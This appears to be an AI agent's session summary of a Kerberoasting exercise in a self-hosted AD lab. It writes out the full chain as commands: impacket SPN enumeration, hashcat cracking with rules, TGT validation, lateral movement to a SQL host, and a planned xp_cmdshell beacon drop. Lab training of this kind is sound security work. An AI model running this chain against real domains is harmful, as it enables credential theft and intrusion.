thread_id: 019052ac-9905-7e03-bc1b-148466481d25
updated_at: 2026-07-01T08:54:59+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\07\01\rollout-2026-07-01T16-24-59-019052ac-9905-7e03-bc1b-148466481d25.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Kerberoasted a service account in the self-hosted AD lab, cracked the RC4 hash with hashcat and confirmed the plaintext.

Rollout context: cwd was `C:\Workspace\pentest-lab`, Windows + PowerShell, Kali VM against the self-hosted AD lab. Purpose was the Kerberoasting exercise from the same lab reading list. GPU box was a workstation with an local GPU for hashcat.

## Task 1: End-to-end Kerberoasting: SPN enumeration → TGS request → hashcat → shell

Outcome: success

Preference signals:
- One shell script per exercise, checked into the lab repo, comments in Chinese.
- The user wanted to see the wordlist / rules that actually cracked the hash so the same recipe can be reused.
- Prefer `impacket-GetUserSPNs` for hash extraction over Rubeus if both are available (cross-platform).

Key steps:
- Enumerated SPN accounts with `impacket-GetUserSPNs lab.local/<low_user>:<pw> -dc-ip <dc> -request` → three RC4 (`$krb5tgs$23$*`) hashes.
- Fed hashes into `hashcat -m 13100 -a 0 hashes.txt rockyou.txt -r rules/best64.rule` → cracked one after ~25 minutes on the local GPU (the intentionally weak `SqlSvc` password from the lab setup).
- Verified the cracked plaintext with `impacket-getTGT lab.local/SqlSvc:<cracked_pw>` → valid TGT.
- Used the TGT for a lateral move to the SQL host via `impacket-mssqlclient -k -no-pass 'lab.local/SqlSvc@sql01.lab.local'`.
- Documented that `xp_cmdshell` was disabled on the target — the user's plan was to enable it via `EXEC sp_configure` and drop a beacon there in the next exercise.

Failures and how to do differently:
- First tried `-m 13100 -a 0` with only `rockyou.txt` (no rules) and got no crack in 90 minutes; adding `best64` (and later `dive`) matched the intentional weakness pattern.
- Forgot to `-force` on WSL initially; hashcat complained about VRAM detection under WSL2.

Reusable knowledge:
- Kerberoasting hashcat mode = `-m 13100` (RC4/etype 23). AES etype = 19700 / 19800; AES hashes are much slower per candidate but still crackable on a 4090.
- `best64.rule` is the small first pass; `dive.rule` or `d3ad0ne.rule` widen coverage for medium-strength passwords; expect longer walltime.
- Always verify a crack with `getTGT` before using it — a hash collision is rare but wastes hours if you skip verification.

References:
- [1] Script: `roast.sh`
- [2] hashcat version: 6.2.6
- [3] Wordlist: `rockyou.txt` + `rules/best64.rule`
